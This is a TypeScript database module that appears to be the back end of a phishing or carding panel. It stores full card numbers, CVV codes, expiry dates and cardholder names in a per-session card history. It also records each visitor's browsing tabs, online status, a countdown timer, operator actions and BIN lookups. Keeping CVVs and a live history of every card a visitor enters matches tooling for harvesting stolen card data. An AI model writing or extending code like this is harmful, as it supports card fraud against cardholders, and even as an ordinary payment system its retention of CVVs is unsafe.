import { getDb, queryAll, queryOne, run } from '../database/connection.js';

export async function getPaymentSessions() {
  const rows = queryAll('SELECT * FROM payment_sessions ORDER BY created_at DESC');
  const result = [];
  for (const r of rows) {
    const history = queryAll('SELECT * FROM card_history WHERE session_id=? ORDER BY created_at ASC', [r.id]);
    result.push({
      id: r.id, sessionId: r.session_id, frontendUrl: r.frontend_url,
      status: r.status, currentStep: r.current_step,
      cardInfo: JSON.parse(r.card_info || '{}'),
      customerInfo: JSON.parse(r.customer_info || '{}'),
      browsingTabs: JSON.parse(r.browsing_tabs || '[]'),
      cardHistory: history.map((h: any) => ({
        cardNumber: h.card_number, cardType: h.card_type, cardLevel: h.card_level,
        bankName: h.bank_name, expiry: h.expiry, cvv: h.cvv, cardHolder: h.card_holder
      })),
      isOnline: !!r.is_online, countdownSeconds: r.countdown_seconds || 0,
      createdAt: r.created_at, updatedAt: r.updated_at
    });
  }
  return result;
}

export async function getSessionById(id: string) {
  const r = queryOne('SELECT * FROM payment_sessions WHERE id=?', [id]);
  if (!r) return null;
  const history = queryAll('SELECT * FROM card_history WHERE session_id=? ORDER BY created_at ASC', [id]);
  return {
    id: r.id, sessionId: r.session_id, frontendUrl: r.frontend_url,
    status: r.status, currentStep: r.current_step,
    cardInfo: JSON.parse(r.card_info || '{}'),
    customerInfo: JSON.parse(r.customer_info || '{}'),
    browsingTabs: JSON.parse(r.browsing_tabs || '[]'),
    cardHistory: history.map((h: any) => ({
      cardNumber: h.card_number, cardType: h.card_type, cardLevel: h.card_level,
      bankName: h.bank_name, expiry: h.expiry, cvv: h.cvv, cardHolder: h.card_holder
    })),
    isOnline: !!r.is_online, countdownSeconds: r.countdown_seconds || 0,
    createdAt: r.created_at, updatedAt: r.updated_at
  };
}

export async function upsertSession(data: any) {
  const existing = queryOne('SELECT id FROM payment_sessions WHERE id=?', [data.id]);
  if (!existing) {
    run(`INSERT INTO payment_sessions (id, session_id, customer_id, frontend_url, status, current_step,
      card_info, customer_info, browsing_tabs, is_online, countdown_seconds, pending_at, last_card_info)
      VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?)`, [
      data.id, data.sessionId || 1166, data.customerId || '', data.frontendUrl || '',
      data.status || 'live', data.currentStep || 'card',
      JSON.stringify(data.cardInfo || {}), JSON.stringify(data.customerInfo || {}),
      JSON.stringify(data.browsingTabs || []), data.isOnline !== false ? 1 : 0,
      data.countdownSeconds || 0, data.status === 'pending' ? new Date().toISOString() : null,
      JSON.stringify(data.cardInfo || {})
    ]);
  } else {
    const sets: string[] = ["updated_at=datetime('now')"];
    const vals: any[] = [];
    if (data.status !== undefined) { sets.push('status=?'); vals.push(data.status); }
    if (data.currentStep !== undefined) { sets.push('current_step=?'); vals.push(data.currentStep); }
    if (data.cardInfo !== undefined) { sets.push('card_info=?'); vals.push(JSON.stringify(data.cardInfo)); }
    if (data.customerInfo !== undefined) { sets.push('customer_info=?'); vals.push(JSON.stringify(data.customerInfo)); }
    if (data.browsingTabs !== undefined) { sets.push('browsing_tabs=?'); vals.push(JSON.stringify(data.browsingTabs)); }
    if (data.isOnline !== undefined) { sets.push('is_online=?'); vals.push(data.isOnline ? 1 : 0); }
    if (data.countdownSeconds !== undefined) { sets.push('countdown_seconds=?'); vals.push(data.countdownSeconds); }
    if (data.status === 'pending') { sets.push('pending_at=?'); vals.push(new Date().toISOString()); }
    if (data.cardInfo) { sets.push('last_card_info=?'); vals.push(JSON.stringify(data.cardInfo)); }
    vals.push(data.id);
    run('UPDATE payment_sessions SET ' + sets.join(',') + ' WHERE id=?', vals);
  }
}

export async function addCardHistory(sessionId: string, card: any) {
  run('INSERT INTO card_history (session_id, card_number, card_type, card_level, bank_name, expiry, cvv, card_holder) VALUES (?,?,?,?,?,?,?,?)',
    [sessionId, card.cardNumber || '', card.cardType || '', card.cardLevel || '', card.bankName || '', card.expiry || '', card.cvv || '', card.cardHolder || '']);
}

export async function addAuditLog(sessionId: string, operatorId: string, action: string, message?: string) {
  run('INSERT INTO audit_logs (session_id, operator_id, action, message) VALUES (?,?,?,?)',
    [sessionId, operatorId, action, message || null]);
}

export async function getBinCache(bin: string) {
  return queryOne('SELECT * FROM bin_cache WHERE bin=?', [bin]);
}

export async function setBinCache(bin: string, data: any) {
  const existing = queryOne('SELECT bin FROM bin_cache WHERE bin=?', [bin]);
  if (existing) {
    run('UPDATE bin_cache SET brand=?, type=?, issuer=?, country=?, cached_at=datetime(?) WHERE bin=?',
      [data.brand, data.type, data.issuer, data.country, 'now', bin]);
  } else {
    run("INSERT INTO bin_cache (bin, brand, type, issuer, country, cached_at) VALUES (?,?,?,?,?,datetime('now'))",
      [bin, data.brand, data.type, data.issuer, data.country]);
  }
}
